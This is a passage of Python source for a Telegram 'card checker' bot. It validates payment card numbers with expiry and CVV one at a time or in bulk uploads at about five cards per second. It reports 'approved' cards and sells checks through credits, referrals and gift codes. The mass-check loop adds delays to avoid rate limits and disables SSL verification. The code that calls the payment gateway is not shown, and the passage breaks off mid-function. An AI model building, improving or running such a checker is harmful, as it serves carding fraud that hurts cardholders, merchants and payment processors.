    info_text = f"""*{BOT_INFO['name']}*
══════════════════════
*Version:* {BOT_INFO['version']}
*Creator:* @ISHANT_OFFICIAL
*Gates:* {BOT_INFO['gates']}

*Features:*
{BOT_INFO['features']}

*Your Stats:*
• Credits: *{user['credits']}*
• Total Checks: *{user['total_checks']}*

*User Commands:*
• `/start` - Start bot
• `/chk cc|mm|yy|cvv` - Check single card
• `/mchk` - Upload file for mass check
• `/credits` - Check balance
• `/claim CODE` - Redeem gift code
• `/invite` - Invite friends & earn credits
• `/info` - This information
• `/cancel` - Cancel mass check
• `/help` - All commands
"""
    
    # Add admin commands if user is admin
    if is_admin:
        info_text += """
*Admin Commands:*
• `/addcr user_id amount` - Add credits
• `/gengift credits max_uses` - Create gift code
• `/listgifts` - List all gift codes
• `/userinfo user_id` - View user info
• `/botinfo` - Bot statistics
"""
    
    info_text += """
*Owner:* 👑 @ISHANT_OFFICIAL
*Support:* Contact @ISHANT_OFFICIAL
══════════════════════
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        info_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Get referral stats
    referrals_count = user.get('referrals_count', 0)
    earned_from_referrals = user.get('earned_from_referrals', 0)
    
    keyboard = [
        [InlineKeyboardButton("🎁 Claim Gift Code", callback_data="claim_gift"),
         InlineKeyboardButton("🤝 Invite & Earn", callback_data="invite")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n"
        f"*Referrals:* {referrals_count} users (+{earned_from_referrals} credits earned)\n\n"
        f"*Credit Usage:*\n"
        f"• Single check: 1 credit (deducted for any check attempt)\n"
        f"• Mass check: 1 credit per card (deducted for all processed cards)\n\n"
        f"*Get More Credits:*\n"
        f"1. Invite friends: +50 credits each\n"
        f"2. Claim gift codes with /claim\n"
        f"3. Ask admin for credits\n"
        f"4. Wait for promotions\n\n"
        f"*Note:* Credits are deducted for ALL check attempts, approved or declined.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /invite command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How it works:*\n"
        f"1. Share your invite link with friends\n"
        f"2. When they join using your link:\n"
        f"   • You get 50 credits\n"
        f"   • They get 10 credits\n"
        f"3. Earn unlimited credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} users\n"
        f"• Earned from Referrals: {user.get('earned_from_referrals', 0)} credits\n\n"
        f"*Copy and share your link now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single card check - ULTRA FAST"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await update.message.reply_text(
            "*❌ ACCESS DENIED*\n"
            "Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check command format
    if not context.args:
        await update.message.reply_text(
            "*❌ INVALID FORMAT*\n"
            "══════════════════════\n"
            "*Usage:* `/chk cc|mm|yy|cvv`\n\n"
            "*Example:*\n"
            "`/chk 4111111111111111|12|2025|123`\n\n"
            "*Cost:* 1 credit per check\n"
            "*Speed:* ⚡ Instant",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    card_input = " ".join(context.args)
    
    # Validate card format
    parts = card_input.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "*❌ INVALID CARD FORMAT*\n"
            "Use: `cc|mm|yy|cvv`\n"
            "Example: `4111111111111111|12|25|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if user has credits
    if user["credits"] <= 0:
        await update.message.reply_text(
            "*💰 INSUFFICIENT CREDITS*\n"
            "══════════════════════\n"
            "You don't have enough credits to check cards.\n\n"
            "*Options:*\n"
            "• Invite friends with /invite\n"
            "• Claim a gift code with /claim\n"
            "• Contact admin for credits\n\n"
            "*Your balance:* 0 credits",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text(
        "*⚡ PROCESSING CARD...*\n"
        "Checking at ultra-fast speed...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Start timer for speed measurement
    start_time = time.time()
    
    # Check the card
    result_card, status, message, http_code = await check_single_card_fast(card_input)
    
    # Calculate processing time
    process_time = time.time() - start_time
    
    # Update user stats and ALWAYS deduct credit for ANY check attempt
    updates = {
        'credits': user["credits"] - 1,
        'credits_spent': user.get("credits_spent", 0) + 1,
        'checks_today': user.get("checks_today", 0) + 1,
        'total_checks': user["total_checks"] + 1,
        'last_check_date': datetime.datetime.now().date()
    }
    
    if status == "approved":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
    else:
        updates['declined_cards'] = user.get("declined_cards", 0) + 1
    
    await update_user(user_id, updates)
    
    # Update bot statistics
    await update_bot_stats({
        'total_checks': 1,
        'total_credits_used': 1
    })
    
    if status == "approved":
        await update_bot_stats({'total_approved': 1})
    else:
        await update_bot_stats({'total_declined': 1})
    
    # Refresh user data
    user = await get_user(user_id)
    
    # Prepare user stats for display
    user_stats = {
        "approved": user.get("approved_cards", 0),
        "declined": user.get("declined_cards", 0),
        "total_approved": user.get("approved_cards", 0),
        "total_declined": user.get("declined_cards", 0)
    }
    
    # Format result
    result_text = format_card_result(result_card, status, message, user["credits"], user_stats)
    
    # Add speed info
    speed_text = f"\n*Speed:* ⚡ {process_time:.2f}s"
    result_text = result_text.replace("══════════════════════", f"══════════════════════\n{speed_text}")
    
    # Update message with result
    await processing_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mchk command for mass check"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if user has uploaded a file
    if user_id not in files_storage:
        await update.message.reply_text(
            "*📁 MASS CHECK INSTRUCTIONS*\n"
            "══════════════════════\n"
            "1. Upload a .txt file with cards\n"
            "2. Then use `/mchk` command again\n\n"
            "*Format in file:*\n"
            "`cc|mm|yy|cvv`\n"
            "`cc|mm|yy|cvv`\n"
            "...\n\n"
            "*Features:*\n"
            "• ⚡ 5 cards/second speed\n"
            "• Live real-time results\n"
            "• Cancel anytime with /cancel\n"
            "• Credits deducted per processed card",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Get file info
    file_info = files_storage[user_id]
    
    # Download file
    try:
        file = await context.bot.get_file(file_info["file_id"])
        file_content = await file.download_as_bytearray()
        cards_text = file_content.decode('utf-8')
        cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:50]}")
        return
    
    if len(cards) == 0:
        await update.message.reply_text("❌ No cards found in file.")
        return
    
    # Validate cards format
    valid_cards = []
    invalid_cards = []
    
    for card in cards:
        parts = card.split("|")
        if len(parts) == 4:
            valid_cards.append(card)
        else:
            invalid_cards.append(card)
    
    if len(valid_cards) == 0:
        await update.message.reply_text("❌ No valid cards found in file.")
        return
    
    # Check if user has enough credits
    if user["credits"] < len(valid_cards):
        await update.message.reply_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards to check:* {len(valid_cards)}\n"
            f"*Credits needed:* {len(valid_cards)}\n"
            f"*Your credits:* {user['credits']}\n\n"
            f"You need {len(valid_cards) - user['credits']} more credits.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Show confirmation
    await update.message.reply_text(
        f"*📊 MASS CHECK READY*\n"
        f"══════════════════════\n"
        f"*Valid Cards:* {len(valid_cards)}\n"
        f"*Invalid Cards:* {len(invalid_cards)}\n"
        f"*Your Credits:* {user['credits']}\n\n"
        f"*Credit System:*\n"
        f"• Credits deducted for all processed cards\n"
        f"• Cancel anytime with /cancel\n\n"
        f"*Speed:* ⚡ 5 cards/second\n\n"
        f"To start, click the button below:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START CHECKING", callback_data=f"start_mass_{len(valid_cards)}")],
            [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_mass")]
        ])
    )
    
    # Store valid cards
    files_storage[user_id]["cards"] = valid_cards
    files_storage[user_id]["invalid_cards"] = invalid_cards

async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /claim command for gift codes"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user['joined_channel']:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "*❌ Usage:* `/claim CODE`\n\n"
            "*Example:* `/claim ABC123XYZ456DEF7`\n\n"
            "Ask admin for gift codes or wait for announcements.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    code = context.args[0].upper().strip()
    
    # Check if code exists
    gift_code = await get_gift_code(code)
    if not gift_code:
        await update.message.reply_text(
            f"*❌ INVALID GIFT CODE*\n\n"
            f"Code `{code}` not found or expired.\n"
            f"Make sure you entered it correctly.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check if user already claimed this code
    async with db_pool.acquire() as conn:
        claimed = await conn.fetchrow(
            'SELECT * FROM user_claimed_codes WHERE user_id = $1 AND code = $2',
            user_id, code
        )
    
    if claimed:
        await update.message.reply_text(
            f"*❌ ALREADY CLAIMED*\n\n"
            f"You have already claimed gift code `{code}`.\n"
            f"Each user can claim a code only once.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Check max uses
    if gift_code['max_uses'] and gift_code['uses'] >= gift_code['max_uses']:
        await update.message.reply_text(
            f"*❌ CODE LIMIT REACHED*\n\n"
            f"Code `{code}` has been claimed too many times.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Add credits to user
    credits_to_add = gift_code['credits']
    await update_user(user_id, {'credits': user['credits'] + credits_to_add})
    
    # Update gift code usage
    await update_gift_code_usage(code, user_id)
    
    # Refresh user data
    user = await get_user(user_id)
    
    await update.message.reply_text(
        f"*🎉 GIFT CODE CLAIMED!*\n"
        f"══════════════════════\n"
        f"*Code:* `{code}`\n"
        f"*Credits added:* {credits_to_add}\n"
        f"*New balance:* {user['credits']} credits\n\n"
        f"Thank you for using {BOT_INFO['name']}!",
        parse_mode=ParseMode.MARKDOWN
    )

# ==================== ADMIN COMMANDS ====================

async def addcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Add credits to user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/addcr user_id amount`\n"
            "*Example:* `/addcr 123456789 100`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        amount = int(context.args[1])
        
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        user = await get_user(target_user_id)
        await update_user(target_user_id, {'credits': user['credits'] + amount})
        user = await get_user(target_user_id)  # Refresh
        
        await update.message.reply_text(
            f"*✅ CREDITS ADDED*\n"
            f"══════════════════════\n"
            f"*User:* `{target_user_id}`\n"
            f"*Added:* {amount} credits\n"
            f"*New Balance:* {user['credits']} credits",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"*🎉 CREDITS ADDED*\n\n"
                     f"You received *{amount} credits* from admin!\n"
                     f"New balance: *{user['credits']} credits*",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass  # User might have blocked bot
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")

async def gengift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Generate gift code"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/gengift credits max_uses`\n"
            "*Example:* `/gengift 50 10`\n"
            "Creates a code worth 50 credits, usable 10 times.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        credits = int(context.args[0])
        max_uses = int(context.args[1])
        
        if credits <= 0 or max_uses <= 0:
            await update.message.reply_text("❌ Credits and max uses must be positive.")
            return
        
        # Generate unique code
        code = generate_gift_code()
        gift_code = await get_gift_code(code)
        while gift_code:
            code = generate_gift_code()
            gift_code = await get_gift_code(code)
        
        # Create gift code
        await create_gift_code(code, credits, max_uses, user_id)
        
        await update.message.reply_text(
            f"*🎁 GIFT CODE GENERATED*\n"
            f"══════════════════════\n"
            f"*Code:* `{code}`\n"
            f"*Credits:* {credits}\n"
            f"*Max Uses:* {max_uses}\n"
            f"*Created:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"Share with users:\n"
            f"`/claim {code}`",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid credits or max uses.")

async def listgifts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: List all gift codes"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    gift_codes = await get_all_gift_codes()
    
    if not gift_codes:
        await update.message.reply_text("📭 No gift codes generated yet.")
        return
    
    response = "*🎁 ACTIVE GIFT CODES*\n══════════════════════\n"
    
    for gift in list(gift_codes)[:20]:
        uses_left = gift['max_uses'] - gift['uses'] if gift['max_uses'] else 'Unlimited'
        response += f"• `{gift['code']}` - {gift['credits']} credits ({gift['uses']}/{uses_left} used)\n"
    
    if len(gift_codes) > 20:
        response += f"\n... and {len(gift_codes) - 20} more codes"
    
    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command - Cancel ongoing mass check"""
    user_id = update.effective_user.id
    
    if user_id not in checking_tasks:
        await update.message.reply_text(
            "*ℹ️ NO ACTIVE CHECK*\n"
            "You don't have any ongoing mass check.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if checking_tasks[user_id]["cancelled"]:
        await update.message.reply_text(
            "*ℹ️ ALREADY CANCELLED*\n"
            "Your mass check is already being cancelled.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    checking_tasks[user_id]["cancelled"] = True
    
    await update.message.reply_text(
        "*🛑 CANCELLATION REQUESTED*\n"
        "Your mass check will be cancelled shortly.\n"
        "You'll receive a summary when it's complete.",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    # Get user ID from either message or callback query
    if update.message:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or "User"
    elif update.callback_query:
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or "User"
    else:
        return
    
    # Get user data
    user = await get_user(user_id)
    
    # Different help for admin vs regular users
    if user_id in ADMIN_IDS:
        help_text = f"""*{escape_markdown(BOT_INFO['name'])}*
══════════════════════
👋 *Welcome, {escape_markdown(user_name)}!*

*Account Overview:*
• Credits: *{user['credits']}*
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: *{user['total_checks']}*

*User Commands:*
• `/chk cc|mm|yy|cvv` - Check single card
• `/mchk` - Upload file for mass check
• `/credits` - Check balance
• `/claim CODE` - Redeem gift code
• `/invite` - Invite friends & earn credits
• `/info` - Bot information
• `/cancel` - Cancel mass check
• `/help` - This help

*Admin Commands:*
• `/addcr user_id amount` - Add credits
• `/gengift credits max_uses` - Create gift code
• `/listgifts` - List all gift codes
• `/userinfo user_id` - View user info
• `/botinfo` - Bot statistics

*Owner:* 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    else:
        help_text = f"""*{escape_markdown(BOT_INFO['name'])}*
══════════════════════
👋 *Welcome, {escape_markdown(user_name)}!*

*Account Overview:*
• Credits: *{user['credits']}*
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: *{user['total_checks']}*

*User Commands:*
• `/chk cc|mm|yy|cvv` - Check single card
• `/mchk` - Upload file for mass check
• `/credits` - Check balance
• `/claim CODE` - Redeem gift code
• `/invite` - Invite friends & earn credits
• `/info` - Bot information
• `/cancel` - Cancel mass check
• `/help` - This help

*Owner:* 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    
    # Send the message
    try:
        if update.message:
            await update.message.reply_text(
                help_text, 
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text, 
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        # Fallback to plain text without markdown
        if update.message:
            await update.message.reply_text(
                help_text.replace('*', '').replace('`', '').replace('_', ''),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text.replace('*', '').replace('`', '').replace('_', ''),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
            )

async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle verify join callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    await update_user(user_id, {'joined_channel': True})
    
    await query.edit_message_text(
        "*✅ ACCESS GRANTED*\n"
        "══════════════════════\n"
        "Channel membership verified successfully!\n"
        "You now have full access to all features.\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN
    )

async def claim_gift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle claim gift callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /claim CODE to redeem gift code")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*💰 CLAIM GIFT CODE*\n"
        "══════════════════════\n"
        "To claim a gift code, use:\n"
        "`/claim CODE`\n\n"
        "*Example:*\n"
        "`/claim ABC123XYZ456DEF7`\n\n"
        "*Note:* Each code can be claimed only once per user.\n"
        "Ask admin for gift codes or wait for announcements.",
        parse_mode=ParseMode.MARKDOWN
    )

async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /userinfo command - Admin view user info"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return
    
    if user_id not in ADMIN_IDS:
        await message.reply_text(
            "❌ This command is for administrators only.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not context.args:
        await message.reply_text(
            "*❌ Usage:* `/userinfo user_id`\n"
            "*Example:* `/userinfo 123456789`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        user = await get_user(target_user_id)
        
        # Get claimed codes
        async with db_pool.acquire() as conn:
            claimed = await conn.fetch(
                'SELECT code FROM user_claimed_codes WHERE user_id = $1',
                target_user_id
            )
        
        # Calculate success rate
        total_user_checks = user.get('total_checks', 0)
        approved_cards = user.get('approved_cards', 0)
        success_rate = (approved_cards / total_user_checks * 100) if total_user_checks > 0 else 0
        
        # Get referrer info if exists
        referrer_info = ""
        if user.get('referrer_id'):
            referrer = await get_user(user['referrer_id'])
            referrer_info = f"\n*Referred by:* @{referrer.get('username', 'N/A')} ({user['referrer_id']})"
        
        user_info = f"""*👤 USER INFO (ADMIN)*
══════════════════════
*User ID:* `{target_user_id}`
*Username:* @{user.get('username', 'N/A')}
*Name:* {user.get('first_name', 'N/A')}
*Joined:* {user.get('joined_date', 'N/A')[:10]}
*Channel:* {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
*Last Active:* {user.get('last_active', 'Never')[:19] if user.get('last_active') else 'Never'}
{referrer_info}

*Credits:* {user.get('credits', 0)}
*Credits Spent:* {user.get('credits_spent', 0)}

*Statistics:*
• Total Checks: {total_user_checks}
• Today's Checks: {user.get('checks_today', 0)}
• ✅ Approved: {approved_cards}
• ❌ Declined: {user.get('declined_cards', 0)}
• Success Rate: {success_rate:.1f}%

*Referrals:* {user.get('referrals_count', 0)} users
*Earned from Referrals:* {user.get('earned_from_referrals', 0)} credits

*Claimed Codes:* {len(claimed)}
══════════════════════
"""
        if claimed:
            user_info += "\n*Claimed Gift Codes:*\n"
            for code in claimed[:10]:
                user_info += f"• `{code['code']}`\n"
            if len(claimed) > 10:
                user_info += f"• ... and {len(claimed) - 10} more\n"
        
        await message.reply_text(user_info, parse_mode=ParseMode.MARKDOWN)
        
    except ValueError:
        await message.reply_text("❌ Invalid user ID.")
    except Exception as e:
        logger.error(f"Error in userinfo_command: {e}")
        await message.reply_text("❌ An error occurred while fetching user info.")

async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /botinfo command - Shows bot statistics (admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ This command is for administrators only.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    stats = await get_bot_stats()
    
    # Calculate bot uptime
    start_time = stats["start_time"]
    if isinstance(start_time, str):
        start_time = datetime.datetime.fromisoformat(start_time.replace('Z', '+00:00'))
    uptime = datetime.datetime.now() - start_time
    days = uptime.days
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    # Calculate success rate
    total_checks = stats["total_checks"]
    success_rate = (stats["total_approved"] / total_checks * 100) if total_checks > 0 else 0
    
    # Calculate average credits per user
    avg_credits = stats["total_credits_used"] / stats["total_users"] if stats["total_users"] > 0 else 0
    
    # Get active users count
    async with db_pool.acquire() as conn:
        active_users = await conn.fetchval('''
            SELECT COUNT(*) FROM users 
            WHERE last_active > NOW() - INTERVAL '1 day'
        ''')
        
        # Get total gift codes
        total_gift_codes = await conn.fetchval('SELECT COUNT(*) FROM gift_codes')
    
    await update.message.reply_text(
        f"*📊 BOT STATISTICS (ADMIN)*\n"
        f"══════════════════════\n"
        f"*Uptime:* {days}d {hours}h {minutes}m\n"
        f"*Started:* {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"*User Statistics:*\n"
        f"• Total Users: {stats['total_users']}\n"
        f"• Active Today: {active_users}\n\n"
        f"*Card Checking Stats:*\n"
        f"• Total Checks: {total_checks}\n"
        f"• ✅ Approved: {stats['total_approved']}\n"
        f"• ❌ Declined: {stats['total_declined']}\n"
        f"• Success Rate: {success_rate:.1f}%\n\n"
        f"*Credit Statistics:*\n"
        f"• Total Credits Used: {stats['total_credits_used']}\n"
        f"• Avg Credits/User: {avg_credits:.1f}\n"
        f"• Active Gift Codes: {total_gift_codes}\n\n"
        f"*System Status:*\n"
        f"• Setup Cache: {'✅ Active' if 'nonce' in setup_intent_cache else '❌ Expired'}\n"
        f"• Active Checks: {len(checking_tasks)}\n"
        f"• Database: ✅ Connected",
        parse_mode=ParseMode.MARKDOWN
    )

# ==================== MASS CHECK FUNCTIONS ====================

async def start_mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass check from callback - ULTRA FAST with rotation"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    if user_id not in files_storage or "cards" not in files_storage[user_id]:
        await query.edit_message_text("❌ No cards found. Please upload file again.")
        return
    
    cards = files_storage[user_id]["cards"]
    user = await get_user(user_id)
    
    # Check if user has enough credits
    if user["credits"] < len(cards):
        await query.edit_message_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards to check:* {len(cards)}\n"
            f"*Credits needed:* {len(cards)}\n"
            f"*Your credits:* {user['credits']}\n\n"
            f"You need {len(cards) - user['credits']} more credits.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Create cancel button
    keyboard = [[InlineKeyboardButton("🛑 CANCEL CHECK", callback_data=f"cancel_check_{user_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_msg = await query.edit_message_text(
        f"*🚀 MASS CHECK STARTED*\n"
        f"══════════════════════\n"
        f"*Total Cards:* {len(cards)}\n"
        f"*Your Credits:* {user['credits']}\n"
        f"*Status:* ⚡ Processing at 5 cards/second\n\n"
        f"*Live Results:* Starting...\n"
        f"══════════════════════\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⏳ Processed: 0/{len(cards)}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
    
    # Store task
    task = asyncio.create_task(mass_check_task_ultrafast(user_id, cards, status_msg, query.message.chat_id, context))
    checking_tasks[user_id] = {
        "task": task, 
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "chat_id": query.message.chat_id,
        "message_id": query.message.message_id,
        "start_time": time.time(),
        "approved": 0,
        "declined": 0
    }
    
    # Cleanup file storage
    if user_id in files_storage:
        del files_storage[user_id]

async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context):
    """ULTRA-FAST mass checking with rotation and live results"""
    processed = 0
    approved = 0
    declined = 0
    user = await get_user(user_id)
    
    # Calculate initial credits
    initial_credits = user["credits"]
    
    # Create session for reuse
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    try:
        session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
        # Process cards one by one with delays to avoid rate limits
        for i, card in enumerate(cards):
            # Check if cancelled
            if user_id in checking_tasks and checking_tasks[user_id]["cancelled"]:
                break
            
            # Update status every 5 cards
            if i % 5 == 0 or i == len(cards) - 1:
                elapsed = time.time() - checking_tasks[user_id]["start_time"]
                cards_per_second = processed / elapsed if elapsed > 0 else 0
                progress = (processed / len(cards)) * 100
                
                try:
                    await status_msg.edit_text(
                        f"*🚀 MASS CHECK IN PROGRESS*\n"
                        f"══════════════════════\n"
                        f"*Total Cards:* {len(cards)}\n"
                        f"*Credits Used:* {processed}\n"
                        f"*Speed:* ⚡ {cards_per_second:.1f} cards/second\n"
                        f"*Status:* {progress:.1f}% complete\n\n"
                        f"*Live Results:*\n"
                        f"══════════════════════\n"
                        f"✅ Approved: {approved}\n"
                        f"❌ Declined: {declined}\n"
                        f"⏳ Processed: {processed}/{len(cards)}",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            
            # Check single card
            result_card, status, message, http_code = await check_single_card_fast(card)
            
            processed += 1
            
            # Update task data
            if user_id in checking_tasks:
                checking_tasks[user_id]["cards_processed"] = processed
            
            if status == "approved":
                approved += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["approved"] = approved
                
                # Send approved result
                try:
                    result_text = format_card_result(result_card, status, message)
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=result_text,
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            else:
                declined += 1
                if user_id in checking_tasks:
                    checking_tasks[user_id]["declined"] = declined
            
            # Small delay to avoid rate limiting
            if i < len(cards) - 1:
                await asyncio.sleep(0.2)
        
        # Close session
        await session.close()
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
    
    # Final update after all cards processed
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    success_rate = (approved / len(cards) * 100) if cards else 0
    
    # Update user data
    updates = {
        'credits': initial_credits - processed,
        'credits_spent': user.get("credits_spent", 0) + processed,
        'checks_today': user.get("checks_today", 0) + processed,
        'total_checks': user["total_checks"] + processed,
        'approved_cards': user.get("approved_cards", 0) + approved,
        'declined_cards': user.get("declined_cards", 0) + declined,
        'last_check_date': datetime.datetime.now().date()
    }
    await update_user(user_id, updates)
    
    # Update bot statistics
    await update_bot_stats({
        'total_checks': processed,
        'total_credits_used': processed,
        'total_approved': approved,
        'total_declined': declined
    })
    
    # Refresh user data
